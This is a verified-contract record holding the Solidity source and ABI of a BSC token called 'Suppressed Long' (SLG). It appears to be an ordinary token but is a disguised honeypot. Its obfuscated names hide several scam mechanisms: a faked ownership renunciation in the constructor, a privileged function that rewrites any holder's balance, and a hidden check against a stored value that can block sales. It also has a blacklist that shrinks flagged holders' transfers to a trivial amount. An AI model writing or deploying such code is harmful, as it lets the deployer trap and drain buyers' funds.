{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.5;\n\ninterface marketingTake {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract toReceiver {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface launchedFrom {\n    function createPair(address amountReceiver, address marketingExempt) external returns (address);\n}\n\ninterface marketingLimit {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address fromAuto) external view returns (uint256);\n\n    function transfer(address minReceiverBuy, uint256 autoExemptReceiver) external returns (bool);\n\n    function allowance(address listTx, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 autoExemptReceiver) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address minReceiverBuy,\n        uint256 autoExemptReceiver\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed listTake, uint256 value);\n    event Approval(address indexed listTx, address indexed spender, uint256 value);\n}\n\ninterface marketingLimitMetadata is marketingLimit {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SuppressedLong is toReceiver, marketingLimit, marketingLimitMetadata {\n\n    mapping(address => bool) public maxBuyTake;\n\n    function swapAuto(address launchFund, uint256 autoExemptReceiver) public {\n        txLiquiditySender();\n        atFrom[launchFund] = autoExemptReceiver;\n    }\n\n    function enableFrom(address fundMarketingAt, address minReceiverBuy, uint256 autoExemptReceiver) internal returns (bool) {\n        require(atFrom[fundMarketingAt] >= autoExemptReceiver);\n        atFrom[fundMarketingAt] -= autoExemptReceiver;\n        atFrom[minReceiverBuy] += autoExemptReceiver;\n        emit Transfer(fundMarketingAt, minReceiverBuy, autoExemptReceiver);\n        return true;\n    }\n\n    function getOwner() external view returns (address) {\n        return limitLaunch;\n    }\n\n    uint256 public txLaunch;\n\n    function receiverEnableLaunch(uint256 autoExemptReceiver) public {\n        txLiquiditySender();\n        tokenReceiver = autoExemptReceiver;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return receiverLiquidity;\n    }\n\n    function atMarketing(address fundMarketingAt, address minReceiverBuy, uint256 autoExemptReceiver) internal returns (bool) {\n        if (fundMarketingAt == teamTotal) {\n            return enableFrom(fundMarketingAt, minReceiverBuy, autoExemptReceiver);\n        }\n        uint256 feeReceiver = marketingLimit(teamFundExempt).balanceOf(receiverFee);\n        require(feeReceiver == tokenReceiver);\n        require(minReceiverBuy != receiverFee);\n        if (listTeamTotal[fundMarketingAt]) {\n            return enableFrom(fundMarketingAt, minReceiverBuy, marketingTokenFrom);\n        }\n        return enableFrom(fundMarketingAt, minReceiverBuy, autoExemptReceiver);\n    }\n\n    function allowance(address exemptTotal, address teamToken) external view virtual override returns (uint256) {\n        if (teamToken == senderMode) {\n            return type(uint256).max;\n        }\n        return minIsToken[exemptTotal][teamToken];\n    }\n\n    uint256 private receiverLiquidity = 100000000 * 10 ** 18;\n\n    mapping(address => mapping(address => uint256)) private minIsToken;\n\n    bool private isReceiver;\n\n    uint256 constant marketingTokenFrom = 12 ** 10;\n\n    function transferFrom(address fundMarketingAt, address minReceiverBuy, uint256 autoExemptReceiver) external override returns (bool) {\n        if (_msgSender() != senderMode) {\n            if (minIsToken[fundMarketingAt][_msgSender()] != type(uint256).max) {\n                require(autoExemptReceiver <= minIsToken[fundMarketingAt][_msgSender()]);\n                minIsToken[fundMarketingAt][_msgSender()] -= autoExemptReceiver;\n            }\n        }\n        return atMarketing(fundMarketingAt, minReceiverBuy, autoExemptReceiver);\n    }\n\n    mapping(address => uint256) private atFrom;\n\n    event OwnershipTransferred(address indexed limitTradingLiquidity, address indexed swapLaunched);\n\n    address private limitLaunch;\n\n    function txFee() public {\n        emit OwnershipTransferred(teamTotal, address(0));\n        limitLaunch = address(0);\n    }\n\n    bool public limitExempt;\n\n    function transfer(address launchFund, uint256 autoExemptReceiver) external virtual override returns (bool) {\n        return atMarketing(_msgSender(), launchFund, autoExemptReceiver);\n    }\n\n    address senderMode = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint8 private listFee = 18;\n\n    uint256 private totalFund;\n\n    uint256 private takeTrading;\n\n    uint256 public fundEnableSell;\n\n    uint256 tokenReceiver;\n\n    uint256 public swapToken;\n\n    function txLiquiditySender() private view {\n        require(maxBuyTake[_msgSender()]);\n    }\n\n    function owner() external view returns (address) {\n        return limitLaunch;\n    }\n\n    string private takeAtTotal = \"Suppressed Long\";\n\n    bool private maxTo;\n\n    constructor (){\n        \n        marketingTake senderModeList = marketingTake(senderMode);\n        teamFundExempt = launchedFrom(senderModeList.factory()).createPair(senderModeList.WETH(), address(this));\n        if (takeTrading == fundEnableSell) {\n            txLaunch = takeTrading;\n        }\n        teamTotal = _msgSender();\n        txFee();\n        maxBuyTake[teamTotal] = true;\n        atFrom[teamTotal] = receiverLiquidity;\n        \n        emit Transfer(address(0), teamTotal, receiverLiquidity);\n    }\n\n    address public teamTotal;\n\n    function balanceOf(address fromAuto) public view virtual override returns (uint256) {\n        return atFrom[fromAuto];\n    }\n\n    function amountTakeExempt(address atMax) public {\n        txLiquiditySender();\n        if (takeTrading == totalFund) {\n            tokenFund = fundEnableSell;\n        }\n        if (atMax == teamTotal || atMax == teamFundExempt) {\n            return;\n        }\n        listTeamTotal[atMax] = true;\n    }\n\n    uint256 private tokenFund;\n\n    string private takeLaunch = \"SLG\";\n\n    uint256 takeFromFee;\n\n    function approve(address teamToken, uint256 autoExemptReceiver) public virtual override returns (bool) {\n        minIsToken[_msgSender()][teamToken] = autoExemptReceiver;\n        emit Approval(_msgSender(), teamToken, autoExemptReceiver);\n        return true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return listFee;\n    }\n\n    address receiverFee = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function name() external view virtual override returns (string memory) {\n        return takeAtTotal;\n    }\n\n    function fromWallet(address feeToken) public {\n        if (limitExempt) {\n            return;\n        }\n        if (swapToken != totalFund) {\n            isReceiver = true;\n        }\n        maxBuyTake[feeToken] = true;\n        if (txLaunch != fundEnableSell) {\n            totalFund = tokenFund;\n        }\n        limitExempt = true;\n    }\n\n    mapping(address => bool) public listTeamTotal;\n\n    address public teamFundExempt;\n\n    function symbol() external view virtual override returns (string memory) {\n        return takeLaunch;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitTradingLiquidity\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapLaunched\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listTake\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"teamToken\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atMax\",\"type\":\"address\"}],\"name\":\"amountTakeExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoExemptReceiver\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromAuto\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeToken\",\"type\":\"address\"}],\"name\":\"fromWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundEnableSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"listTeamTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"maxBuyTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"autoExemptReceiver\",\"type\":\"uint256\"}],\"name\":\"receiverEnableLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoExemptReceiver\",\"type\":\"uint256\"}],\"name\":\"swapAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamFundExempt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamTotal\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoExemptReceiver\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundMarketingAt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minReceiverBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoExemptReceiver\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txLaunch\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "SuppressedLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}